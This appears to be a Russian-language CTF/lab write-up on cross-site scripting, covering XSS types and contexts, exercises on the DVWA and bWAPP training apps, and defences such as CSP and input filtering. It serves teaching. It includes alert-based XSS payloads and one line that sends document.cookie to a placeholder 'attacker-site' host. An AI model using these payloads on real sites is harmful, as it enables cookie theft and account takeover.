@@ -1,0 +1,795 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <p dir="auto">
+  Авторы данной страницы: Шуруб Игорь (
+  <a href="https://github.com/igorshurub">
+   https://github.com/igorshurub
+  </a>
+  ) и Заднепрянская Алисия (
+  <a href="https://github.com/ZadnepryanskayaAlicia">
+   https://github.com/ZadnepryanskayaAlicia
+  </a>
+  )
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   XSS уязвимости (Cross-Site Scripting — межсайтовый
+            скриптинг)
+  </h1>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Теория
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Определение
+  </h3>
+ </div>
+ <p dir="auto">
+  XSS (англ. Cross-Site Scripting – «межсайтовый скриптинг») встречается в веб-приложениях. Атаки XSS
+        возникают из-за недостаточной фильтрации данных, отправляемых пользователем для вставки в веб-страницу. Суть
+        уязвимости заключается в возможности внедрения кода на страницу, которую просматривают другие пользователи, и
+        взаимодействии этого кода с веб-сервером злоумышленника. Запуск скрипта предоставит злоумышленнику доступ к
+        информации типа «Пользователь-сайт», при этом браузер будет думать, что код запущен из доверенного источника.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Виды XSS
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Stored XSS:
+   </strong>
+  </li>
+ </ul>
+ <p dir="auto">
+  Сохраненный межсайтовый скриптинг (также известный как XSS второго порядка или постоянный) возникает,
+        когда приложение получает данные из ненадежного источника и включает эти данные в свои последующие HTTP-ответы
+        небезопасным способом. Код запускается каждый раз, когда пользователь посещает конкретный сайт.
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Reflected XSS:
+   </strong>
+  </li>
+ </ul>
+ <p dir="auto">
+  Отраженный XSS включает внедрение вредоносного исполняемого кода в HTTP-ответ. Вредоносный скрипт не
+        находится в веб-приложении и не сохраняется. Браузер жертвы выполняет атаку только в том случае, если
+        пользователь открывает веб-страницу или ссылку, созданную злоумышленником.
+ </p>
+ <p dir="auto">
+  Один запрос и ответ браузера доставляет и выполняет полезную нагрузку атаки. Созданные параметры HTTP
+        или URI содержат строку атаки, которую веб-приложение обрабатывает неправильно.
+        Особое внимание можно уделить соответствующим функциям приложения, таким как комментарии к сообщениям в блоге.
+        Когда отправленное значение наблюдается в ответе, необходимо определить, действительно ли данные хранятся в
+        разных запросах, а не просто отражаются в немедленном ответе.
+ </p>
+ <p dir="auto">
+  Когда определили связи между точками входа и выхода в процессе обработки приложения, каждая ссылка
+        должна быть специально протестирована, чтобы определить, присутствует ли сохраненная уязвимость XSS. Это
+        включает в себя определение контекста в ответе, в котором отображаются сохраненные данные, и тестирование
+        подходящих потенциальных полезных нагрузок XSS, применимых к этому контексту. На данный момент методология
+        тестирования в целом такая же, как и для поиска отраженных уязвимостей XSS.
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    DOM XSS
+   </strong>
+  </li>
+ </ul>
+ <p dir="auto">
+  XSS на основе DOM, также известная как XSS типа 0, представляет собой атаку XSS, в которой полезная
+        нагрузка атаки выполняется путем изменения DOM в браузере жертвы. Это приводит к тому, что клиент запускает код
+        без ведома или согласия пользователя. Сама страница (т. е. HTTP-ответ) не изменится, но злонамеренное изменение
+        в среде DOM приведет к тому, что клиентский код, содержащийся на странице, будет выполняться по-другому.
+ </p>
+ <p dir="auto">
+  Это отличается от отраженных или сохраненных атак XSS, которые размещают полезную нагрузку на страницу
+        ответа из-за уязвимостей на стороне сервера. DOM XSS – это уязвимость на стороне клиента.
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Blind XSS
+   </strong>
+  </li>
+ </ul>
+ <p dir="auto">
+  Является частным случаем Stored XSS. Его отличительной чертой является то, что данные, вводимые
+        злоумышленником, и сохраняемые на сервере, отображаются в другой части веб-приложения.
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Self XSS
+   </strong>
+  </li>
+ </ul>
+ <p dir="auto">
+  Self-XSS (self cross-site scripting) – это атака социальной инженерии, используемая для получения
+        контроля над веб-учетными записями жертв. При самостоятельной XSS-атаке жертва атаки неосознанно запускает
+        вредоносный код в своем собственном веб-браузере, тем самым предоставляя личную информацию злоумышленнику,
+        своего рода уязвимость, известная как межсайтовый скриптинг. Self-XSS работает путем обмана пользователей, также
+        заставляя их копировать и вставлять вредоносный контент в консоль веб-разработчика их браузеров.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Как проверить, к какому типу относится инъекция (Reflected,
+            Stored, DOM, Self или Blind)
+  </h3>
+ </div>
+ <p dir="auto">
+  Чтобы проверить, к какому типу относится инъекция необходимо знать информацию об инъекции, а также их
+        отличительные особенности (ключевые моменты).
+ </p>
+ <p dir="auto">
+  В типе инъекции
+  <strong>
+   Stored
+  </strong>
+  существует возможность внедрения кода в веб-страницу, которую
+        просматривают другие пользователи сайта.
+  <strong>
+   Ключевой момент
+  </strong>
+  : постоянные XSS не требуют от жертвы
+        участия, ей достаточно просто открыть страницу с хранимой XSS. Как только жертва обращается к сохраненной
+        информации, она вместе с информацией получает вредоносный скрипт.
+ </p>
+ <p dir="auto">
+  В типе инъекции
+  <strong>
+   Reflected
+  </strong>
+  данные возвращаются пользователю сразу и при этом не
+        проверяются.
+  <strong>
+   Также ключевой момент
+  </strong>
+  : атака не сработает, пока злоумышленник не отправит ссылку
+        другим пользователям сайта.
+ </p>
+ <p dir="auto">
+  В типе
+  <strong>
+   DOM
+  </strong>
+  инъекция осуществляется в параметры структуры DOM, в частности
+        document.url, document.location и document.referrer. Общий принцип в целом совпадает с предыдущими (происходит
+        запуск кода без его проверки).
+  <strong>
+   Но ключевой момент
+  </strong>
+  : нельзя отследить наличие кода инъекции в
+        отображаемой HTML-странице, т.к. вредоносный скрипт не уходит на сервер, а выполняется (и может оставаться)
+        непосредственно в браузере пользователя.
+ </p>
+ <p dir="auto">
+  В типе инъекции
+  <strong>
+   SELF
+  </strong>
+  только сам пользователь сайта может выполнить код, который
+        приводит к XSS.
+  <strong>
+   Ключевой момент:
+  </strong>
+  чтобы эксплуатировать Self XSS, злоумышленник должен заставить
+        пользователя выполнить нужный ему код, поэтому злоумышленники прибегают к социальной инженерии при эксплуатации
+        Self XSS.
+ </p>
+ <p dir="auto">
+  Тип инъекции
+  <strong>
+   Blind XSS
+  </strong>
+  является частным случаем Stored XSS. Она возникает, когда
+        данные, вводимые злоумышленником, сохраняются на сервере, но отображаются в другой части приложения или вообще в
+        другом приложении, отличном от того, в котором они были введены.
+  <strong>
+   Ключевой момент:
+  </strong>
+  код
+        злоумышленника не обязательно выполнится именно в какой-либо форме, обычно это какой-то внешний сервис.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Контексты XSS
+  </h3>
+ </div>
+ <p dir="auto">
+  При тестировании отраженных и сохраненных XSS ключевой задачей является идентификация контекста XSS:
+        местоположение в ответе, где отображаются данные, контролируемые злоумышленником. Любая проверка входных данных
+        или другая обработка, выполняемая приложением для этих данных. Основываясь на этих деталях, можно выбрать одну
+        или несколько потенциальных полезных нагрузок XSS и проверить, эффективны ли они, и отфильтровать по событиям и
+        тегам и посмотреть, какие векторы требуют взаимодействия с пользователем.
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Простой HTML контекст
+                Возникает в теле существующего HTML-тега или в начале (конце) страницы вне тега
+   </p>
+   <ul dir="auto">
+    <li>
+     <code>
+      &lt;html_tag&gt;user_input&lt;html_tag&gt;
+     </code>
+    </li>
+    <li>
+     <code>
+      &lt;img src=x onerror=alert(1)&gt;
+     </code>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    Контекст HTML- комментариев
+                Внутри секции комментариев HTML
+   </p>
+   <ul dir="auto">
+    <li>
+     <code>
+      &lt;!--comment user_input comment--&gt;
+     </code>
+    </li>
+    <li>
+     <code>
+      --&gt;&lt;img src=x onerror=alert(1)&gt;
+     </code>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    Контекст имени HTML атрибута
+                Внутри открытого HTML тэга, после имени тэга или после значения атрибута.
+   </p>
+   <ul dir="auto">
+    <li>
+     <code>
+      &lt;html_tag user_input attr_name=”attrib_value”/&gt;
+     </code>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    Контекст значения HTML атрибута
+                Внутри открытого HTML тэга, после имени атрибута отделённого символом =.
+   </p>
+   <ul dir="auto">
+    <li>
+     <code>
+      &lt;html_tag attr_name=”user_input”/&gt;
+     </code>
+    </li>
+   </ul>
+  </li>
+ </ul>
+ <p dir="auto">
+  Есть три вариации этого контекста:
+ </p>
+ <ol dir="auto">
+  <li>
+   атрибут внутри двойных кавычек;
+  </li>
+  <li>
+   атрибут внутри одинарных кавычек;
+  </li>
+  <li>
+   атрибут без кавычек.
+  </li>
+ </ol>
+ <ul dir="auto">
+  <li>
+   Атрибуты события
+  </li>
+ </ul>
+ <p dir="auto">
+  Значения этих атрибутов выполняются как JavaScript. Тоже самое, что и JavaScript контекст.
+ </p>
+ <ul dir="auto">
+  <li>
+   URL атрибуты
+  </li>
+ </ul>
+ <p dir="auto">
+  Эти атрибуты принимают URL в качестве значения.
+ </p>
+ <ul dir="auto">
+  <li>
+   Специальные URL атрибуты
+  </li>
+ </ul>
+ <p dir="auto">
+  Это URL атрибуты, где ввод обычных URL может привести к проблемам безопасности.
+ </p>
+ <ul dir="auto">
+  <li>
+   Атрибуты тега МЕТА
+  </li>
+ </ul>
+ <p dir="auto">
+  Meta теги, такие как Charset, могут влиять на то, как содержимые страницы интерпретируется браузером.
+        И есть атрибут http-equiv, который может эмулировать поведение заголовков ответа HTTP. Воздействия на значения
+        заголовков Content-Type, Set-Cookie.
+ </p>
+ <ul dir="auto">
+  <li>
+   Обычные атрибуты
+  </li>
+ </ul>
+ <p dir="auto">
+  Если ввод появляется в значениях обычных атрибутов, то этот контекст должен быть экранирован, чтобы
+        это привело к выполнению кода.
+ </p>
+ <ul dir="auto">
+  <li>
+   Контекст JavaScript
+  </li>
+ </ul>
+ <p dir="auto">
+  Внутри раздела страницы JavaScript кода.
+ </p>
+ <p dir="auto">
+  <code>
+   &lt;script&gt;
+  </code>
+ </p>
+ <p dir="auto">
+  <code>
+   any_javascript
+  </code>
+ </p>
+ <p dir="auto">
+  <code>
+   user_input
+  </code>
+ </p>
+ <p dir="auto">
+  <code>
+   any_javascript
+  </code>
+ </p>
+ <p dir="auto">
+  <code>
+   &lt;/script&gt;
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Поиск XSS уязвимостей
+  </h3>
+ </div>
+ <p dir="auto">
+  Наиболее вероятное место размещения XSS-уязвимости на сайте – это то место, куда обычный пользователь
+        может добавить текст или JavaScript-код.
+        В качестве простых и распространенных проверок на наличие данной уязвимости можно использовать код, который
+        после успешной отработки откроет пользователю стандартное браузерное окно, например, alert. Также нужно обращать
+        внимание на get-параметры запроса, передающиеся в URL запросе, если в get-параметре при поиске появился запрос,
+        то велика вероятность, что страница подвержена уязвимости. В этом случае в тот же код
+  <code>
+   (&lt;script&gt;alert(1)&lt;/script&gt;)
+  </code>
+  вместо запроса подставляем get-параметр и обновляем
+        страницу. В случае успеха в браузере появится окно с 1.
+ </p>
+ <p dir="auto">
+  Например при помощи следующего скрипта:
+  <strong>
+   <code>
+    &lt;script&gt;window.location='http://attacker-site/?cookie='+document.cookie&lt;/script&gt;
+   </code>
+  </strong>
+ </p>
+ <p dir="auto">
+  Можно создать HTTP-запрос на другой URL-адрес, который перенаправляет браузер пользователя на сервер
+        атакующего. URL-адрес включает в себя куки жертвы в качестве параметра запроса. Когда HTTP-запрос приходит на
+        сервер атакующего, он может извлечь эти куки из запроса. После того, как злоумышленник получил куки, он может
+        использовать их, чтобы выдать себя за жертву и начать последующее нападение.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Практика (данная практика из блока уязвимостей
+            metasploitable 3)
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задание 1.
+  </h3>
+ </div>
+ <p dir="auto">
+  Уязвимость XSS (Stored) проекта DVWA на простом (Low) уровне сложности.
+ </p>
+ <p dir="auto">
+  Перейдем на страницу XSS (Stored) проекта DVWA:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/1.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/1.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Попробуем отправить в качестве сообщения HTML-теги:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/2.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/2.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Видим, что в поле Message отобразился отформатированный тегом h1 текст. Это означает, что текст вместе
+        с форматированием сохраняется на сервере и возвращается пользователю отформатированным:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/3.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/3.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Теперь попробуем сохранить на странице скрипт &lt;script&gt;alert(document.cookie)&lt;/script&gt;:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/4.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/4.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Видим всплывающее окно и куки, т. е. XSS есть:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/5.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/5.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Можно теперь зайти на страницу несколько раз и увидеть результат выполнения скрипта:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/6.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/6.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Если открыть исходный код страницы, в нем можно найти те записи, которые есть в таблице, прямо вместе
+        с тегами:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/7.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/7.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>Как мы можем видеть, исполняемый код попадает и сохраняется на сервере именно таким, каким он был отправлен на сервер, даже сохраняются теги. Когда страница будет возвращена пользователю, скрипт будет выполнен. 
+    В данной атаке мы использовали следующий вектор атаки: &lt;script&gt;payload&lt;/script&gt;, вместо payload был использован alert(document.cookie).
+    Модель безопасности в Интернете базируется на политике одинакового источника. Политика одинакового источника (same-origin policy) определяет как документ или скрипт, загруженный из одного источника (origin), может взаимодействовать с ресурсом из другого источника. Это помогает изолировать потенциально вредоносные документы, снижая количество возможных векторов атак.
+    </code></pre>
+ </div>
+ <p dir="auto">
+  XSS позволяет обойти SOP. Поэтому для защиты от атак Reflected XSS необходимо выполнить следующее:
+ </p>
+ <ul dir="auto">
+  <li>
+   Внедрить политику безопасности контента Content Security Policy (CSP)
+  </li>
+  <li>
+   Производить проверку (фильтрацию) данных, которые передаются
+            Также в некоторых случаях необходимо использование парсеров. Существует достаточное количество библиотек для
+            парсинга, поэтому найти и использовать подходящий, не должно быть большой проблемой.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задание 2.
+  </h3>
+ </div>
+ <p dir="auto">
+  Уязвимость XSS (Reflected) проекта DVWA на простом (Low) уровне сложности.
+ </p>
+ <p dir="auto">
+  Перейдем на страницу XSS (Reflected) проекта DVWA (вводимые данные не проверяются):
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/8.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/8.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Попробуем передать туда строку и найти ее в исходном коде страницы, которую вернет сервер:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/9.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/9.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Посмотрим, что отобразилось в выводе приветствия:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/10.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/10.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Если открыть исходный код страницы, мы можем найти введенную строку:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/11.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/11.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Попробуем передать в уязвимый параметр скрипт такого вида:
+        &lt;script&gt;alert(document.cookie)&lt;/script&gt; и посмотрим, что получится:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/12.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/12.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Браузер вернул куки:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/13.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/13.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Теперь снова посмотрим на исходный код возвращенной страницы:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/14.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/14.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Для защиты от данного типа необходимо выполнить следующее:
+ </p>
+ <ul dir="auto">
+  <li>
+   Внедрить политику безопасности контента Content Security Policy (CSP)
+  </li>
+  <li>
+   Производить проверку (фильтрацию) данных, которые передаются
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задание 3.
+  </h3>
+ </div>
+ <p dir="auto">
+  Уязвимость XSS (DOM) проекта DVWA на простом (Low) уровне сложности.
+ </p>
+ <p dir="auto">
+  Перейдем на страницу XSS (DOM) проекта DVWA:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/15.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/15.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Посмотрев исходники данной страницы, видим, что никакой защиты нет:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/16.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/16.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Протестируем нашу страницу, нажав на кнопку «Select»:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/17.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/17.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Видно, что ссылка изменилась, данные передаются методом «GET». В адресной строке URL мы можем
+        попробовать ввести вредоносный код:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/18.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/18.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Вместо слова «English» введем простой скрипт на JavaScript, например, скрипт с alert:
+        &lt;script&gt;alert('Hello World!')&lt;/script&gt;, и он выводит следующее всплывающее окно на странице:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/19.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/19.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задание 4.
+  </h3>
+ </div>
+ <p dir="auto">
+  Наличие XSS вектора, который использует событие onerror, на странице XSS – Reflected GET проекта
+        bWAPP.
+ </p>
+ <p dir="auto">
+  Перейдем на страницу XSS – Reflected GET проекта bWAPP:
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/20.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/20.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Реализуем простой HTML-контекст, используя событие onerror. Контекст возникает в теле существующего
+        HTML-тега или в начале и в конце страницы вне тега . В этом контексте вместо данных можно вписать валидный HTML
+        любого рода, и он немедленно будет воспроизведен браузером. Например, такой:
+  <a href="/AnaktaCTF/CTF/blob/main/WEB/x" rel="noopener noreferrer" target="_blank">
+   <img src="/AnaktaCTF/CTF/raw/main/WEB/x" style="max-width: 100%;"/>
+  </a>
+  :
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/21.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/21.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Это и есть простой HTML-контекст внедрения XSS. В рамках него пользовательский ввод будет выполнен с
+        выполнением всего форматирования:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/22.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/22.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Для защиты от данного типа необходимо выполнить следующее:
+ </p>
+ <ul dir="auto">
+  <li>
+   Внедрить политику безопасности контента Content Security Policy (CSP)
+  </li>
+  <li>
+   Производить проверку (фильтрацию) данных, которые передаются
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задание 5.
+  </h3>
+ </div>
+ <p dir="auto">
+  Уязвимость XSS на странице XSS – Stored (Coookies) проекта bWAPP на простом (Low) уровне сложности.
+ </p>
+ <p dir="auto">
+  Перейдем на страницу XSS – Stored (Coookies) проекта bWAPP:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/23.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/23.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Настроим Proxy в браузере:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/24.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/24.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Запустим утилиту BurpSuite:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/25.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/25.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/26.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/26.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  На сайте выберем любимый жанр (например, Science Fiction):
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/27.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/27.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Перейдем в BurpSuite:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/28.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/28.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Поменяем выбранный жанр sci-fi на Comedy (при этом в cookie пока нет значения movie_genry) и отправим
+        запрос (Forward):
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/29.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/29.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Выберем снова жанр:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/30.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/30.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Как мы видим, жанр Comedy отобразился в cookie:
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/zadnepryanskayaalicia/materials/31.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/zadnepryanskayaalicia/materials/31.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Выводы:
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Защита от XSS:
+  </h3>
+ </div>
+ <p dir="auto">
+  Защита от отраженного XSS в первую очередь заключается в том, чтобы избежать использования
+        динамического вредоносного контента из HTTP-запросов для встраивания скриптов в уязвимое приложение. Некоторые
+        подходы к достижению этого включают:
+ </p>
+ <ul dir="auto">
+  <li>
+   Подтвердить ввод пользователя
+  </li>
+ </ul>
+ <p dir="auto">
+  Проверка пользовательского ввода/фильтрация контента формирует первую линию защиты от большинства
+        XSS-атак, включая отраженные XSS. Крайне важно рассматривать пользовательский ввод из любого источника как
+        ненадежный и сформулировать механизмы проверки на соответствие семантическим и грамматическим требованиям.
